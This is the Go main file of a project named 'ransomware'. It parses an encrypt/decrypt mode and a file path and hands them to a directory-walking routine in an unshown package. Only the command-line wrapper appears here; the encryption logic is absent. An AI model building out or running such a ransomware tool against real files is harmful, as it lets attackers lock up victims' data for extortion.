package main

import (
	"fmt"
	"os"
	"ransomware/actions"
	"ransomware/env"
)

func init() {
	env.Load()
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Incorrect usage. Example: ransomware encrypt/decrypt <file-path>")
		os.Exit(1)
	}

	mode := os.Args[1]
	filepath := os.Args[2]

	if mode != "encrypt" && mode != "decrypt" {
		fmt.Println("Invalid mode. Use 'encrypt' or 'decrypt'.")
		os.Exit(1)
	}

	if err := actions.Walk(filepath, mode); err != nil {
		panic(err)
	}
}
